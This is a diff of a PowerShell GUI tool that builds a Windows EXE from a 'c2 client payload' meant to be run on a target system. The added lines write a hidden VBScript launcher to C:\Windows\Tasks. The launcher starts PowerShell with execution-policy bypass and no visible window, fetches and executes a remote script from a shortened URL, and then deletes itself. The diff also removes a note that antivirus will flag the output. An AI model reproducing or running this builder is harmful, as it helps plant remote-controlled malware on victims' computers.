@@ -5,10 +5,7 @@ SYNOPSIS
 This is an easy to use builder application for the c2 client payload - Creates your own EXE file payload for windows systems.
 
 USAGE
-Run this script and input the relevant info, then click build and run the exe on a target system.
-
-NOTES
-AV will likely flag the exe file (not to mention smartscan warnings for unsigned executables etc..)  
+Run this script and input the relevant info, then click build and run the exe on a target system. 
 
 #>
 
@@ -91,16 +88,22 @@ $MainWindow.controls.AddRange(@($TextboxInputHeader, $TextboxInput, $outputHeade
 
 $ps2exe = "https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/ps2exe.ps1"
 $tempps2exe = "C:\Windows\Tasks\ps2exe.ps1"
-$tempc2clientbase = "C:\Windows\Tasks\tgc2.ps1"
 $tempc2client = "C:\Windows\Tasks\tgc2_1.ps1"
 
 $StartBuild.Add_Click({
 
 $TextBox = $TextBoxInput.Text
 $outEXE = $outputbox.Text
-irm $ParentInput.Text | Out-File -FilePath $tempc2clientbase -Force
+
 "`$tg = `"$TextBox`"" | Out-File -FilePath $tempc2client -Force
-Get-Content -Path $tempc2clientbase | Out-File $tempc2client -Append
+"`$tobat = @`"" | Out-File -FilePath $tempc2client -Append
+"Set WshShell = WScript.CreateObject(```"WScript.Shell```")" | Out-File -FilePath $tempc2client -Append
+"WScript.Sleep 200" | Out-File -FilePath $tempc2client -Append
+"WshShell.Run ```"powershell.exe -NonI -NoP -Ep Bypass -W H -C ```$tg='`$tg'; irm is.gd/bwtgc2 | iex```", 0, True" | Out-File -FilePath $tempc2client -Append
+"`"@" | Out-File -FilePath $tempc2client -Append
+
+'$pth = "C:\Windows\Tasks\service.vbs";$tobat | Out-File -FilePath $pth -Force ;& $pth;Sleep 5;rm -Path $pth' | Out-File -FilePath $tempc2client -Append
+
 sleep 2
 i`wr -Uri $ps2exe -OutFile $tempps2exe
 sleep 2
@@ -109,27 +112,21 @@ sleep 5
 $ErrorActionPreference = 'SilentlyContinue'
 $outEXEtest = Get-Content -Path $outEXE
 sleep 1
-
 if($outEXEtest.Length -lt 1){
 $Butt = [System.Windows.MessageBoxButton]::OK
 $Errors = [System.Windows.MessageBoxImage]::Error
 $Asking = 'Build Failed!'
-[System.Windows.MessageBox]::Show($Asking, " Error", $Butt, $Errors) | Out-Null
+[System.Windows.MessageBox]::Show($Asking, " Error", $Butt, $Errors)
 }else{
 $Butt = [System.Windows.MessageBoxButton]::OK
 $Errors = [System.Windows.MessageBoxImage]::Information
 $Asking = 'Build Succeded!'
-[System.Windows.MessageBox]::Show($Asking, " Completed", $Butt, $Errors) | Out-Null
+[System.Windows.MessageBox]::Show($Asking, " Completed", $Butt, $Errors)
 }
 
 rm -Path $tempc2client -Force
-rm -Path $tempc2clientbase -Force
 rm -Path $tempps2exe -Force
 })
 
-
-
-$MainWindow.ShowDialog() | Out-Null
+$MainWindow.ShowDialog()
 exit 
-
-
